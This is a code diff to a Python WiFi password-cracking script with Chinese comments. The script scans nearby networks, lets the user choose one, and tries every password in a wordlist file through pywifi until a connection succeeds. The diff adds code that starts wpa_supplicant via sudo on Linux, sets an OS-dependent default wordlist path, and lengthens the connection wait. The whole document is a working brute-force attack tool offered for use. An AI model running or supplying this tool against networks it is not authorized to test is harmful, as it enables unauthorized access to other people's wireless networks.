@@ -1,7 +1,26 @@
 import os
 import time
+import platform
+import subprocess
 from pywifi import PyWiFi, const, Profile
 from tqdm import tqdm
+
+def start_wpa_supplicant(interface):
+    """
+    启动 wpa_supplicant 服务（如果尚未运行）
+    """
+    try:
+        # 检查 wpa_supplicant 是否正在运行
+        result = subprocess.run(['pgrep', 'wpa_supplicant'], stdout=subprocess.PIPE)
+        if result.returncode != 0:
+            # wpa_supplicant 未运行，启动它
+            cmd = ['sudo', 'wpa_supplicant', '-B', '-i', interface, '-c', '/etc/wpa_supplicant/wpa_supplicant.conf']
+            subprocess.run(cmd, check=True)
+            print("wpa_supplicant 已启动")
+        else:
+            print("wpa_supplicant 已在运行")
+    except Exception as e:
+        print(f"无法启动 wpa_supplicant: {e}")
 
 def scan_wifi(iface):
     """
@@ -15,7 +34,7 @@ def scan_wifi(iface):
     """
     iface.scan()
     print("---扫描周围WiFi中---")
-    for _ in tqdm(range(30), desc="扫描进度", unit="s"):
+    for _ in tqdm(range(10), desc="扫描进度", unit="s"):
         time.sleep(1)
     wifi_list = sorted(iface.scan_results(), key=lambda x: x.signal, reverse=True)  # 根据信号强度排序
     for idx, wifi in enumerate(wifi_list):
@@ -23,7 +42,6 @@ def scan_wifi(iface):
         signal_strength = str(wifi.signal + 100) + "%"
         print(f"{idx + 1}. WiFi名称: {ssid}, 信号强度: {signal_strength}")
     return wifi_list
-
 
 def connect_to_wifi(iface, password, ssid):
     """
@@ -47,7 +65,7 @@ def connect_to_wifi(iface, password, ssid):
         iface.remove_all_network_profiles()
         iface.add_network_profile(profile)
         iface.connect(profile)
-        time.sleep(1)
+        time.sleep(5)
         if iface.status() == const.IFACE_CONNECTED:
             return True
         else:
@@ -56,7 +74,6 @@ def connect_to_wifi(iface, password, ssid):
     except Exception as e:
         print(f"连接失败: {e}")
         return False
-
 
 def select_interface(wifi):
     """
@@ -92,7 +109,17 @@ def select_interface(wifi):
         except ValueError:
             print("请输入有效的数字序号。")
 
+def get_default_password_file():
+    """
+    获取默认的密码文件路径，根据操作系统选择默认文件名。
 
+    返回:
+    str: 密码文件路径
+    """
+    if platform.system() == "Windows":
+        return os.path.join(os.path.dirname(__file__), "密码本.txt")
+    else:
+        return os.path.join(os.path.expanduser("~"), "密码本.txt")
 
 def crack_wifi():
     """
@@ -103,6 +130,10 @@ def crack_wifi():
         iface = select_interface(wifi)
         if not iface:
             return
+
+        # 启动 wpa_supplicant 服务 (仅限 Linux)
+        if platform.system() != "Windows":
+            start_wpa_supplicant(iface.name())
 
         # 检查网卡是否已连接到WiFi
         if iface.status() == const.IFACE_CONNECTED:
@@ -133,7 +164,7 @@ def crack_wifi():
 
         print("---开始破解---")
 
-        specify_password_file = input("是否指定密码本文件路径？（y/n） 默认为 N：").strip().lower()
+        specify_password_file = input("是否指定密码本文件路径？（y/n） 默认为 n：").strip().lower()
 
         if specify_password_file == 'y':
             example_password_file = os.path.join(os.path.dirname(__file__), "其他目录的密码本.txt")
@@ -143,8 +174,7 @@ def crack_wifi():
                 print("密码本文件不存在，请检查路径是否正确。")
                 return
         else:
-            default_password_file = os.path.join(os.path.dirname(__file__), "密码本.txt")
-            password_file = default_password_file
+            password_file = get_default_password_file()
 
         with open(password_file, "r") as f:
             passwords = f.readlines()
@@ -152,7 +182,6 @@ def crack_wifi():
         try:
             for pwd in tqdm(passwords, desc="破解进度", unit="password", leave=False):
                 if connect_to_wifi(iface, pwd.strip(), wifi_name):
-
                     print(f"破解成功，密码为: {pwd.strip()}")
                     break
             else:
@@ -164,6 +193,4 @@ def crack_wifi():
 
     except KeyboardInterrupt:
         print("\n程序已终止。")
-
-
 
